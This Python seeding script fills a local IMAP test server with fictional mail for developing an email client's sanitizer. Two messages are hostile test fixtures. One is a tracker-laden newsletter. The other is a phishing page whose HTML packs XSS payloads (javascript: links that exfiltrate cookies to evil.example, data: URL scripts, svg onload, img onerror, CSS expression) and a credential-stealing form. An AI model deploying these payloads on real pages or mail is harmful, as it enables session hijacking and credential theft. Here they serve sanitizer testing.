#!/usr/bin/env python3
"""Fill a local IMAP test server with realistic mail, for working on the Mail
Space without a real account.

Run GreenMail (needs only Java), on ports nothing else uses:

    curl -LO https://repo1.maven.org/maven2/com/icegreen/greenmail-standalone/2.1.14/greenmail-standalone-2.1.14.jar
    java -Dgreenmail.smtp.port=30250 -Dgreenmail.imap.port=31430 \\
         -Dgreenmail.hostname=127.0.0.1 -Dgreenmail.users=dev:devpass@example.test \\
         -Dgreenmail.users.login=email -jar greenmail-standalone-2.1.14.jar

then `python3 seed.py`, and in the app connect with "Another provider":
address dev@example.test, server 127.0.0.1, port 31430, no encryption,
password devpass. GreenMail keeps everything in memory, so restarting it
empties the mailbox; run this again after.

Everything here is made up. Some of it is hostile on purpose: the HTML
newsletter carries trackers, scripts and remote images, and the "account
suspended" mail is a phishing page full of forms, frames and javascript:
links, for checking what the sanitizer lets through.
"""

import imaplib
import os
import struct
import sys
import zlib
from email.message import EmailMessage
from email.utils import format_datetime, make_msgid, parsedate_to_datetime
from datetime import datetime, timedelta, timezone

HOST = os.environ.get("IMAP_HOST", "127.0.0.1")
PORT = int(os.environ.get("IMAP_PORT", "31430"))
USER = os.environ.get("IMAP_USER", "dev@example.test")
PASSWORD = os.environ.get("IMAP_PASSWORD", "devpass")
ME = ("Devon Theriault", USER)

NOW = datetime.now(timezone.utc)


def ago(**kw):
    return NOW - timedelta(**kw)


def png(w=96, h=64, tint=(90, 120, 220)):
    """A small gradient PNG, made by hand so the script needs nothing installed."""
    rows = b""
    for y in range(h):
        rows += b"\x00"
        for x in range(w):
            r = (tint[0] + x * 2) % 256
            g = (tint[1] + y * 2) % 256
            b = tint[2]
            rows += bytes((r, g, b))

    def chunk(kind, data):
        c = struct.pack(">I", len(data)) + kind + data
        return c + struct.pack(">I", zlib.crc32(kind + data) & 0xFFFFFFFF)

    ihdr = struct.pack(">IIBBBBB", w, h, 8, 2, 0, 0, 0)
    return b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", ihdr) + chunk(b"IDAT", zlib.compress(rows)) + chunk(b"IEND", b"")


def pdf(text):
    """A one-page PDF saying `text`."""
    stream = f"BT /F1 18 Tf 72 720 Td ({text}) Tj ET".encode()
    objs = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>",
        b"<< /Length " + str(len(stream)).encode() + b" >>\nstream\n" + stream + b"\nendstream",
        b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
    ]
    out = b"%PDF-1.4\n"
    offsets = []
    for i, o in enumerate(objs, 1):
        offsets.append(len(out))
        out += f"{i} 0 obj\n".encode() + o + b"\nendobj\n"
    xref = len(out)
    out += f"xref\n0 {len(objs) + 1}\n0000000000 65535 f \n".encode()
    for off in offsets:
        out += f"{off:010d} 00000 n \n".encode()
    out += f"trailer << /Size {len(objs) + 1} /Root 1 0 R >>\nstartxref\n{xref}\n%%EOF\n".encode()
    return out


def mail(frm, to, subject, when, text=None, html=None, msgid=None, reply_to=None, cc=None, headers=None):
    m = EmailMessage()
    m["From"] = f"{frm[0]} <{frm[1]}>"
    m["To"] = ", ".join(f"{n} <{a}>" for n, a in to)
    if cc:
        m["Cc"] = ", ".join(f"{n} <{a}>" for n, a in cc)
    m["Subject"] = subject
    m["Date"] = format_datetime(when)
    m["Message-ID"] = msgid or make_msgid(domain=frm[1].split("@")[1])
    if reply_to is not None:
        m["In-Reply-To"] = reply_to[-1]
        m["References"] = " ".join(reply_to)
    for k, v in (headers or {}).items():
        m[k] = v
    if text is not None:
        m.set_content(text)
    if html is not None:
        if text is None:
            m.set_content(html, subtype="html")
        else:
            m.add_alternative(html, subtype="html")
    return m


PRIYA = ("Priya Raman", "priya@northwind.example")
MARCO = ("Marco Bellini", "marco@northwind.example")
SAM = ("Sam Okafor", "sam.okafor@gmail.example")
SUPPORT = ("Lena from Fernweh Support", "support@fernweh.example")
GITHUB = ("Mona Lisa", "notifications@github.example")
INVOICES = ("Hetzel Cloud", "billing@hetzel.example")
NEWS = ("This Week in Rust", "newsletter@rustweekly.example")
PHISH = ("Securlty Team", "no-reply@paypa1-security.example")
MAMA = ("Mom", "linda.theriault@family.example")
ALEX = ("Alex Kim", "alex@kim.example")


def seed():
    box = {"INBOX": [], "Sent": [], "Archive": [], "Trash": [], "Drafts": [],
           "Projects/Orchestrate": [], "Projekte/Entwürfe": []}

    def put(folder, m, seen=False, flagged=False):
        flags = []
        if seen:
            flags.append("\\Seen")
        if flagged:
            flags.append("\\Flagged")
        box[folder].append((m, flags))

    # A conversation over four messages, one of them the user's own reply.
    r1 = make_msgid(domain="northwind.example")
    r2 = make_msgid(domain="example.test")
    r3 = make_msgid(domain="northwind.example")
    r4 = make_msgid(domain="northwind.example")
    put("INBOX", mail(PRIYA, [ME], "Q4 roadmap review — agenda", ago(days=2, hours=5), msgid=r1, cc=[MARCO], text=(
        "Hi Devon,\n\nAhead of Thursday's review, here's what I'd like us to cover:\n\n"
        "1. Where the Spaces work stands (Notes, Calendar, Mail)\n"
        "2. Whether MCP access for agents ships in 0.3 or 0.4\n"
        "3. The phone build: TestFlight feedback so far\n\n"
        "Could you bring a short demo of Mail? Even read-only is fine.\n\nThanks,\nPriya\n")), seen=True)
    put("Sent", mail(ME, [PRIYA], "Re: Q4 roadmap review — agenda", ago(days=2, hours=3), msgid=r2, reply_to=[r1], cc=[MARCO], text=(
        "Sounds good. I'll have Mail reading and searching by then, and handing a thread\n"
        "to an agent. No sending yet: that stays with the user.\n\n"
        "On Thu, Priya Raman <priya@northwind.example> wrote:\n> Hi Devon,\n> Ahead of Thursday's review...\n")), seen=True)
    put("INBOX", mail(PRIYA, [ME], "Re: Q4 roadmap review — agenda", ago(days=1, hours=20), msgid=r3, reply_to=[r1, r2], cc=[MARCO], text=(
        "Perfect, that's exactly the scope I hoped for. Marco will join for the MCP part.\n\n"
        "> Sounds good. I'll have Mail reading and searching by then...\n")), seen=True)
    put("INBOX", mail(MARCO, [ME, PRIYA], "Re: Q4 roadmap review — agenda", ago(hours=3), msgid=r4, reply_to=[r1, r2, r3], text=(
        "One request for the MCP part: can agents search mail but never send it?\n"
        "Security will ask, and I'd like to say yes with a straight face.\n\n"
        "Marco\n\nOn Wed, Priya Raman wrote:\n> Perfect, that's exactly the scope I hoped for.\n")))

    # A bug report, the kind of mail worth handing to an agent.
    put("INBOX", mail(SUPPORT, [ME], "Checkout fails with a 500 on Safari 18", ago(hours=1, minutes=12), text=(
        "Hi Devon,\n\nThree customers this morning hit an error at the last checkout step, all on\n"
        "Safari 18 (macOS 15). Chrome works. The request that fails:\n\n"
        "  POST /api/checkout/confirm  ->  500\n\n"
        "From our logs:\n\n"
        "  TypeError: Cannot read properties of undefined (reading 'postalCode')\n"
        "      at normalizeAddress (src/checkout/address.ts:48:22)\n"
        "      at confirmOrder (src/checkout/confirm.ts:112:9)\n\n"
        "Looks like Safari's autofill leaves the shipping address object empty when the\n"
        "user picks a saved card. Could someone take a look today?\n\n"
        "Order numbers: FW-20931, FW-20944, FW-20957\n\nLena\nFernweh Support\n")), flagged=True)

    # A GitHub notification, HTML with a text alternative.
    gh_html = """<html><body style="font-family:-apple-system,Segoe UI,Helvetica,Arial,sans-serif">
<p><b>@monalisa</b> opened an issue in <a href="https://github.example/devontheriault/DevCode">devontheriault/DevCode</a></p>
<h3 style="margin:8px 0">Diff pane flickers on window resize (#212)</h3>
<p>When the window is dragged narrower than about 900px the diff pane redraws every frame and
the scroll position jumps to the top. Reproduces on Hyprland and GNOME.</p>
<pre style="background:#f6f8fa;padding:8px;border-radius:6px">Orchestrate 0.2.0 (AppImage)
WebKitGTK 2.50.1</pre>
<p style="color:#57606a;font-size:12px">— <a href="https://github.example/devontheriault/DevCode/issues/212">View it on GitHub</a>
or <a href="https://github.example/notifications/unsubscribe/abc">unsubscribe</a>.</p>
<img src="https://github.example/notifications/beacon/AB12.gif" width="1" height="1" alt="">
</body></html>"""
    put("INBOX", mail(GITHUB, [ME], "[devontheriault/DevCode] Diff pane flickers on window resize (#212)", ago(hours=6),
                      text="@monalisa opened an issue: Diff pane flickers on window resize (#212)\n\nWhen the window is dragged narrower than about 900px the diff pane redraws every frame.\n",
                      html=gh_html, headers={"List-ID": "devontheriault/DevCode <DevCode.devontheriault.github.example>"}))

    # A newsletter: remote images, a tracking pixel, styles and a script.
    news_html = """<!doctype html><html><head><title>This Week in Rust</title>
<style>body{background:url(https://track.rustweekly.example/bg.png)} .hero{color:red}</style>
<script>fetch('https://track.rustweekly.example/opened?u=devon')</script>
<link rel="stylesheet" href="https://rustweekly.example/mail.css">
</head><body onload="alert('hi')" style="margin:0;background:#f4f1ec">
<table width="100%" cellpadding="0" cellspacing="0" bgcolor="#f4f1ec"><tr><td align="center">
<table width="600" cellpadding="24" cellspacing="0" style="background:#ffffff;border-radius:12px;margin:24px 0">
<tr><td>
<img src="https://rustweekly.example/img/header.png" width="552" height="120" alt="This Week in Rust">
<h1 style="font-family:Georgia,serif;color:#b7410e;font-size:28px;margin:16px 0 4px">Issue 612</h1>
<p style="color:#555;font-family:Helvetica,Arial,sans-serif;font-size:15px;line-height:1.5">
Hello and welcome to another issue of <b>This Week in Rust</b>! Async closures are now stable,
and this week's crate is <a href="https://crates.example/crates/ammonia" onclick="steal()">ammonia</a>,
an HTML sanitizer you can trust with mail.</p>
<div style="background:url('https://track.rustweekly.example/div.png');padding:12px;border-left:4px solid #b7410e">
<b>Quote of the week:</b> "The borrow checker is a pair programmer who never gets tired."</div>
<p style="font-family:Helvetica,Arial,sans-serif;font-size:15px">
<a href="https://rustweekly.example/612" style="background:#b7410e;color:#fff;padding:10px 16px;border-radius:6px;text-decoration:none">Read the full issue</a></p>
<img src="https://rustweekly.example/img/crab.png" width="200" alt="Ferris">
<p style="color:#999;font-size:12px">You're receiving this because you subscribed. <a href="https://rustweekly.example/unsub?u=devon">Unsubscribe</a></p>
<img src="https://track.rustweekly.example/open.gif?u=devon" width="1" height="1">
</td></tr></table></td></tr></table></body></html>"""
    put("INBOX", mail(NEWS, [ME], "This Week in Rust 612: async closures are stable", ago(hours=9),
                      text="This Week in Rust, issue 612. Async closures are now stable.\nRead it at https://rustweekly.example/612\n",
                      html=news_html, headers={"List-Unsubscribe": "<https://rustweekly.example/unsub?u=devon>"}))

    # An invoice with a PDF attached.
    inv = mail(INVOICES, [ME], "Your invoice for September 2026", ago(days=1, hours=2), text=(
        "Hello Devon,\n\nYour invoice H-2026-09-48213 for 23.80 EUR is attached and will be charged to\n"
        "your card ending 4242 on 10 October.\n\nHetzel Cloud\n"))
    inv.add_attachment(pdf("Invoice H-2026-09-48213 - 23.80 EUR"), maintype="application", subtype="pdf",
                       filename="Invoice-H-2026-09-48213.pdf")
    put("INBOX", inv, seen=True)

    # Photos: one shown inline by Content-ID, one attached.
    photo = mail(MAMA, [ME], "Pictures from the lake ☀️", ago(days=3), text="The view from the dock this morning. Wish you were here!\n\nLove, Mom\n")
    photo.add_alternative(
        '<p style="font-family:Georgia,serif;font-size:16px">The view from the dock this morning. Wish you were here!</p>'
        '<p><img src="cid:dock-view" width="288" style="border-radius:8px"></p><p>Love, Mom</p>', subtype="html")
    photo.get_payload()[1].add_related(png(tint=(40, 140, 200)), maintype="image", subtype="png", cid="<dock-view>")
    photo.add_attachment(png(tint=(200, 120, 60)), maintype="image", subtype="png", filename="sunset.png")
    put("INBOX", photo, seen=True)

    # Something short and unread.
    put("INBOX", mail(SAM, [ME], "Lunch Thursday?", ago(minutes=25), text="Free for lunch Thursday? The new ramen place on Bank St. 12:30?\n\n— Sam\n"))

    # Phishing, hostile on purpose.
    phish_html = """<html><head><meta http-equiv="refresh" content="0;url=https://paypa1-security.example/login">
<base href="https://paypa1-security.example/"></head><body>
<h2 style="color:#003087;position:fixed;top:0;left:0;z-index:9999">Your account has been suspended</h2>
<p>We noticed unusual activity. <a href="javascript:document.location='https://evil.example/?c='+document.cookie">Verify now</a>
or <a href="JaVaScRiPt:alert(1)">here</a> or <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">here</a>.</p>
<form action="https://paypa1-security.example/steal" method="post"><input name="password" type="password"><button>Log in</button></form>
<iframe src="https://paypa1-security.example/frame" width="400" height="300"></iframe>
<object data="https://paypa1-security.example/x.swf"></object><embed src="https://paypa1-security.example/x.swf">
<svg onload="alert(1)"><circle r="10"/></svg>
<img src="x" onerror="alert('img')">
<div style="width: expression(alert(1)); background-image: u\\72l(https://evil.example/x.png)">styled</div>
<a href="https://paypa1-security.example/login" target="_top" ping="https://evil.example/ping">Sign in to PayPal</a>
</body></html>"""
    put("INBOX", mail(PHISH, [ME], "Your account has been suspended", ago(days=1, hours=7),
                      text="Your account has been suspended. Verify now.", html=phish_html))

    # A forwarded design discussion with a non-ASCII folder.
    put("Projekte/Entwürfe", mail(ALEX, [ME], "Entwürfe für die Präsentation", ago(days=5), text=(
        "Hallo Devon,\n\nanbei die Entwürfe für Donnerstag. Größere Schrift auf Folie 3?\n\nViele Grüße\nAlex\n")), seen=True)

    # Project mail, filed.
    for i, (subj, days) in enumerate([
        ("Orchestrate 0.2.0 is out", 9), ("Re: Host handoff design notes", 12), ("TestFlight build 41 ready", 15)]):
        put("Projects/Orchestrate", mail(ALEX if i % 2 else PRIYA, [ME], subj, ago(days=days),
                                         text=f"{subj}.\n\nNotes inside, have a look when you can.\n"), seen=True)

    # Older mail, archived.
    for i in range(18):
        who = [PRIYA, MARCO, SAM, ALEX][i % 4]
        put("Archive", mail(who, [ME], f"{['Standup notes', 'Design sync', 'Weekend plans', 'Release checklist'][i % 4]} ({i + 1})",
                            ago(days=20 + i * 3), text=f"Archived message number {i + 1}.\n\nSome older context that search should still find: kumquat-{i}.\n"), seen=True)

    put("Trash", mail(NEWS, [ME], "This Week in Rust 610", ago(days=16), text="An older issue."), seen=True)
    put("Drafts", mail(ME, [PRIYA], "Demo notes (draft)", ago(hours=2), text="- reading\n- search\n- send to agent\n"), seen=True)

    imap = imaplib.IMAP4(HOST, PORT)
    imap.login(USER, PASSWORD)
    for folder in box:
        if folder != "INBOX":
            name = imap_utf7(folder)
            imap.create(name)
    for folder, msgs in box.items():
        name = imap_utf7(folder)
        for m, flags in msgs:
            date = imaplib.Time2Internaldate(parsedate_to_datetime(m["Date"]))
            typ, data = imap.append(name, "(" + " ".join(flags) + ")", date, m.as_bytes())
            if typ != "OK":
                sys.exit(f"append to {folder} failed: {data}")
    imap.logout()
    print("seeded", sum(len(v) for v in box.values()), "messages in", len(box), "folders")


def imap_utf7(s):
    """A folder name in IMAP's modified UTF-7, quoted for imaplib."""
    out, run = [], []

    def flush():
        if run:
            import base64
            b = "".join(run).encode("utf-16-be")
            out.append("&" + base64.b64encode(b).decode().rstrip("=").replace("/", ",") + "-")
            run.clear()

    for ch in s:
        if 0x20 <= ord(ch) <= 0x7E:
            flush()
            out.append("&-" if ch == "&" else ch)
        else:
            run.append(ch)
    flush()
    return '"' + "".join(out) + '"'


if __name__ == "__main__":
    seed()
